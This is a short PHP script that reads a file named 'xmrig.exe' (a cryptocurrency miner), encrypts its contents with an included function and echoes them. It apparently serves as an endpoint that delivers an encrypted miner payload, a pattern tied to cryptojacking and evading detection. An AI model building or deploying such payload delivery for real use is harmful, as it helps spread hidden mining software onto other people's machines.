<?php
include_once 'includes/functions.php';

  $data = file_get_contents("xmrig.exe");

  $data = encrypt($data);
  echo $data;




?>
